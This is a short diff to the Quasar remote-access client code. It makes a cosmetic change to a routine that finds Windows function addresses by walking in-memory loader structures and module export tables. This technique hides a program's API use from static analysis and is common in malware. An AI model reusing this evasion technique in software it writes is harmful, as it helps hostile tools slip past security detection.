@@ -31,11 +31,11 @@ namespace Quasar.Client.Utilities
                 var peb = EnvironmentBlockInfo.GetPeb();
                 var ldrData = _PEB_LDR_DATA.Create(peb.Ldr);
                 var mod = ldrData.Find(module);
-                if (object.Equals(mod, default(_LDR_DATA_TABLE_ENTRY)))
+                if (Equals(mod, default(_LDR_DATA_TABLE_ENTRY)))
                     Environment.FailFast("Inexistent module: " + module);
                 var img = PEImage.ReadFromMemory(mod.DllBase, (int)mod.SizeOfImage);
                 var procStr = img.GetExportFunction(proc);
-                if (object.Equals(procStr, default(ExportFunctionInfo)))
+                if (Equals(procStr, default(ExportFunctionInfo)))
                     Environment.FailFast("Inexistent proc: " + proc);
                 addr = (IntPtr)((ulong)mod.DllBase + procStr.RvaAddress);
                 addresses.Add(key, addr);
